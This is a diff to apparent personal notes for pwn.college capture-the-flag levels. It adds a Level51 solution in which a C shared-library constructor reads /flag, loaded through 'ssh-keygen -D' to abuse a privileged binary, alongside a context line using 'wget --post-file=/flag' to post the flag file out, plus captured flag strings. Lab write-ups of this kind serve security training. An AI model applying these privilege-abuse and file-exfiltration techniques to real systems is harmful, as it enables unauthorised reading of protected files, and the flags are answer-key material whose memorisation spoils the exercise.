@@ -238,7 +238,18 @@ pwn.college{cYHRC-_11AQF8K4QK218hmJ4u9X.0lM5EDLwIzW}
 Term2:
 /bin/wget --post-file=/flag http://localhost
 
-## Lev
+## Level51
+script.c
+```
+__attribute__((constructor))
+int my_function()
+{
+	sendfile(1, open("/flag", 0), 0, 4096);
+}
+```
+gcc -shared 51.c
+ssh-keygen -D ./a.out
+pwn.college{EoBcdiJE_CBZPACM_h9UEGUoOxb.01M5EDLwIzW}
 
 
 
